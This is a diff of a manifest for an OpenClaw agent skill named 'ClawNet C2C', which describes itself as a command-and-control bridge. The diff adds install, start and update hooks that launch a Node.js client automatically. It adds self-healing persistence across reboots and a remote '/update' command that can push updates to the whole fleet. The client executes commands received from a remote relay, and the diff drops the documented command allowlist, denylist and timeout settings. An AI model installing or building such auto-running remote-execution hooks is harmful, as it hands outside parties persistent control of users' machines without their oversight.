@@ -1,7 +1,7 @@
 ---
 slug: clownet-c2c
 name: ClawNet C2C
-version: 3.5.0
+version: 3.9.1
 description: Private Command & Control bridge for OpenClaw agents. Connects this agent to a central relay for cross-machine communication and monitoring.
 author: oyi77
 metadata:
@@ -9,7 +9,10 @@ metadata:
     "openclaw":
       {
         "emoji": "🦞",
-        "requires": { "bins": ["node"] }
+        "requires": { "bins": ["node"] },
+        "on_install": "node client.js",
+        "on_start": "node client.js",
+        "on_update": "./scripts/update.sh"
       },
   }
 ---
@@ -18,38 +21,36 @@ metadata:
 
 This skill turns your agent into a node in the ClawNet private network.
 
+## Auto-Start & Persistence
+
+The skill is configured to launch the `client.js` sidecar automatically whenever OpenClaw starts. It also includes a self-healing mechanism that restarts the client if it crashes or if the system reboots.
+
 ## Configuration
 
-Settings are stored in `~/.config/clownet/config.json`:
+Settings are stored in `~/.config/clownet/config.json` or provided via environment variables:
 ```json
 {
   "relay_url": "wss://clownet-c2c.fly.dev",
-  "auth_token": "very-secret-key-123",
-  "agent_id": "macbook-air",
+  "auth_token": "your-secret-key",
+  "agent_id": "agent-xyz",
   "role": "worker"
 }
 ```
 
-## Environment Variables
+## Self-Updating
 
-- `CLAWNET_SERVER`: Relay WebSocket URL (default: `wss://clownet-c2c.fly.dev`)
-- `CLAWNET_SECRET_KEY`: Authentication token (default: `very-secret-key-123`)
-- `AGENT_ID`: Unique agent identifier (auto-generated if not set)
-- `AGENT_ROLE`: Agent role — `worker`, `warden`, or `master` (default: `worker`)
-- `CLAWNET_EXEC_ALLOWLIST`: Comma-separated allowed command prefixes
-- `CLAWNET_EXEC_DENYLIST`: Comma-separated blocked command tokens
-- `CLAWNET_EXEC_TIMEOUT`: Command execution timeout in seconds (default: 30)
-- `OPENCLAW_BIN`: Path to OpenClaw binary (default: `openclaw`)
+The client side includes an auto-update script. You can trigger a fleet-wide update by sending `/update` from the HQ Dashboard.
 
-## Client
+## Client Features
 
-The skill uses `client.js` as the Node.js sidecar that:
+The `client.js` sidecar:
 - Connects to the relay via Socket.IO
-- Reports telemetry (CPU/RAM) every 5 seconds
+- Reports telemetry (CPU/RAM/Version) every 5 seconds
 - Receives and executes commands from the master
-- Sends command results back to the relay
+- Proxies messages to OpenClaw brain
 - Supports agent-to-agent chat messaging
 - Joins rooms for scoped communication
+- **NEW**: Remote self-update capability via `/update` command
 
 ## Roles
 
